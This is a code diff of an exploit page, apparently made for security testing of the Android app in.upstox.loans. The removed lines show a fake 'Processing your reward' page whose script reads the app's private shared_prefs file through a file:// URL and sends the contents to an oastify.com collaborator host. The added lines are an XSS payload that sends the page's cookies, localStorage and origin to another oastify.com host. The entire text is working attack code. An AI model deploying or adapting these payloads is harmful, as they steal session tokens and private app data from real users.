@@ -1,26 +1,3 @@
-<html>
-<body>
-<h1>Processing your reward...</h1>
-<pre id="o"></pre>
-<script>
-var collab = 'https://ybd5s4lgo63q0tcrlxszy5rwange46sv.oastify.com';
-var target = 'file:///data/data/in.upstox.loans/shared_prefs/com.google.firebase.crashlytics.xml';
-var o = document.getElementById('o');
-
-var x = new XMLHttpRequest();
-x.open('GET', target, true);
-x.onload = function() {
-    o.innerText = 'STOLEN: ' + x.responseText;
-    fetch(collab + '/exfiltrated', { method: 'POST', body: x.responseText });
-    new Image().src = collab + '/img?d=' + encodeURIComponent(x.responseText.substring(0,200));
-};
-x.onerror = function() { o.innerText += 'XHR error\n'; };
-x.send();
-
-fetch(target).then(r=>r.text()).then(t=>{
-    o.innerText = 'FETCH STOLEN: ' + t;
-    fetch(collab + '/fetch_exfil', { method: 'POST', body: t });
-}).catch(e=>{ o.innerText += 'fetch err: ' + e + '\n'; });
-</script>
-</body>
-</html>
+<html><body><script>
+document.location="https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/xss_exfil?cookie="+encodeURIComponent(document.cookie)+"&localStorage="+encodeURIComponent(JSON.stringify(localStorage))+"&origin="+encodeURIComponent(window.origin);
+</script></body></html>
